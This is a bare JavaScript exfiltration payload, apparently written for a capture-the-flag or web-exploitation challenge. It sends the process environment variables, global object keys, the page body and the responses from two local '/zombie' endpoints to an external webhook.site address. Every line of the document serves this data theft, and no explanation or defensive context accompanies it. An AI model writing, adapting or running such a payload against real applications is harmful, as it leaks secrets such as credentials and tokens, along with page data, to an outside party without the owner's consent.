var w='https://webhook.site/a772717c-3906-4833-9f3d-e5c9cef5b78a';
try {
  var env = typeof process !== 'undefined' ? JSON.stringify(process.env) : 'no process';
  fetch(w+'/env?d='+encodeURIComponent(env));
} catch(e) { fetch(w+'/env_err?d='+encodeURIComponent(e+'')) }
try {
  var g = typeof global !== 'undefined' ? Object.keys(global).slice(0,50).join(',') : 'no global';
  fetch(w+'/global?d='+encodeURIComponent(g));
} catch(e) { fetch(w+'/g_err?d='+encodeURIComponent(e+'')) }
try { fetch(w+'/btoa?d='+btoa(document.body.innerHTML)) } catch(e) {}
fetch('/zombie?show=The+Walking+Dead').then(r=>r.text()).then(t=>fetch(w+'/twd?d='+encodeURIComponent(t)));
fetch('/zombie?show=shaun').then(r=>r.text()).then(t=>fetch(w+'/shaun?d='+encodeURIComponent(t)));
